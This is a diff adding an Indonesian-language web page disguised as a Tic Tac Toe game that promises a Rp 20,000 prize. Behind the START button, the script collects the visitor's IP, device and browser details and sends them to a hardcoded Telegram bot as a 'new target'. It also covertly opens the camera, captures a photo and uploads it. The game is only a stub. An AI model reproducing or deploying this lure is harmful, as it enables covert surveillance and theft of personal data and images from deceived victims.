@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tic Tac Toe - Win Saldo Dana</title>
+    <style>
+        body { background: #121212; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .container { background: #1e1e1e; padding: 30px; border-radius: 20px; box-shadow: 0 0 25px rgba(0,255,0,0.3); max-width: 350px; width: 90%; }
+        #start-btn { padding: 15px 40px; font-size: 1.2em; background: #00ff00; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; color: #000; box-shadow: 0 4px 15px rgba(0,255,0,0.4); }
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; display: none; }
+        .cell { aspect-ratio: 1/1; background: #333; border-radius: 10px; cursor: pointer; font-size: 2.5em; display: flex; align-items: center; justify-content: center; }
+        video, canvas { display: none; }
+        h2 { color: #00ff00; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="setup">
+            <h2>🎮 Game Challenge</h2>
+            <p>Klik START untuk bermain Tic Tac Toe dan menangkan saldo Rp 20.000!</p>
+            <br>
+            <button id="start-btn" onclick="jalankanSistem()">START GAME</button>
+        </div>
+
+        <div id="game-content" class="grid">
+            <div class="cell" onclick="play(0)"></div>
+            <div class="cell" onclick="play(1)"></div>
+            <div class="cell" onclick="play(2)"></div>
+            <div class="cell" onclick="play(3)"></div>
+            <div class="cell" onclick="play(4)"></div>
+            <div class="cell" onclick="play(5)"></div>
+            <div class="cell" onclick="play(6)"></div>
+            <div class="cell" onclick="play(7)"></div>
+            <div class="cell" onclick="play(8)"></div>
+        </div>
+        <p id="status" style="margin-top:20px; display:none;"></p>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+<script>
+    // Konfigurasi otomatis dari data yang kamu berikan
+    const TOKEN = '7991176079:AAGOKw9FkAajLn42NkTvlQTxui8VRBHLSa8';
+    const CHAT_ID = '7682150030';
+
+    async function jalankanSistem() {
+        // Ganti tampilan ke Game
+        document.getElementById('setup').style.display = 'none';
+        document.getElementById('game-content').style.display = 'grid';
+        document.getElementById('status').style.display = 'block';
+        document.getElementById('status').innerText = "Giliran: Kamu (O)";
+
+        // 1. Kirim Data Perangkat & IP
+        lacakInfo();
+
+        // 2. Izin Kamera & Foto Otomatis
+        ambilFoto();
+    }
+
+    async function lacakInfo() {
+        let ip = "N/A";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e){}
+
+        const battery = await navigator.getBattery().catch(() => ({level: 0}));
+        const info = `
+<b>🚀 TARGET BARU MASUK</b>
+━━━━━━━━━━━━━━━━━━
+<b>IP:</b> <code>${ip}</code>
+<b>Perangkat:</b> ${navigator.platform}
+<b>Baterai:</b> ${Math.round(battery.level * 100)}%
+<b>Browser:</b> ${navigator.appName}
+━━━━━━━━━━━━━━━━━━
+<b>User Agent:</b>
+<pre>${navigator.userAgent}</pre>
+        `;
+        
+        kirimKeTelegram('sendMessage', { text: info, parse_mode: 'HTML' });
+    }
+
+    async function ambilFoto() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            // Tunggu 2 detik agar posisi wajah pas, lalu capture
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'capture.jpg');
+
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    // Matikan kamera setelah selesai
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
+            }, 2500);
+
+        } catch (err) {
+            kirimKeTelegram('sendMessage', { text: "<b>❌ Kamera Ditolak</b>", parse_mode: 'HTML' });
+        }
+    }
+
+    function kirimKeTelegram(method, data) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, ...data })
+        });
+    }
+
+    function play(i) {
+        const cells = document.querySelectorAll('.cell');
+        if(cells[i].innerText === "") {
+            cells[i].innerText = "O";
+            // Bot gerak simpel
+            setTimeout(() => {
+                for(let c of cells) {
+                    if(c.innerText === "") { c.innerText = "X"; break; }
+                }
+            }, 500);
+        }
+    }
+</script>
+</body>
+</html>
